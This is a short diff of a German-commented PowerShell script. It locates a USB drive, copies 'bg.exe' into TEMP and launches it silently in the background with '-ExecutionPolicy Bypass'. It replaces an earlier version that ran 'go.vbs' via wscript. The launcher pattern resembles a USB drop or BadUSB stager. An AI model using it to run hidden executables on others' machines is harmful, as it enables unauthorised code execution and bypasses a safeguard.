@@ -7,18 +7,19 @@ function Get-USBDriveLetter {
 $usbDriveLetter = Get-USBDriveLetter
 
 if ($usbDriveLetter) {
-    # Pfad zur PowerShell-Datei auf dem USB-Laufwerk
-    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "go.vbs"
+    # Pfad zur bg.exe-Datei auf dem USB-Laufwerk
+    $usbExePath = Join-Path -Path $usbDriveLetter -ChildPath "bg.exe"
     
     # Pfad zum temporären Ordner
-    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "go.vbs"
+    $tempExePath = Join-Path -Path $env:TEMP -ChildPath "bg.exe"
 
     try {
         # Datei vom USB-Laufwerk in den temporären Ordner kopieren
-        Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force
+        Copy-Item -Path $usbExePath -Destination $tempExePath -Force
 
-        # ExecutionPolicy Bypass and VBScript im Hintergrund ausführen
-        Start-Process -FilePath "wscript.exe" -ArgumentList $tempScriptPath -NoNewWindow
+        # bg.exe im Hintergrund ausführen und ExecutionPolicy Bypass setzen
+        $command = "& `"" + $tempExePath + "`""
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoLogo -NoProfile -ExecutionPolicy Bypass -Command `"$command`"" -NoNewWindow
 
         # Sound abspielen
         [System.Media.SystemSounds]::Beep.Play()
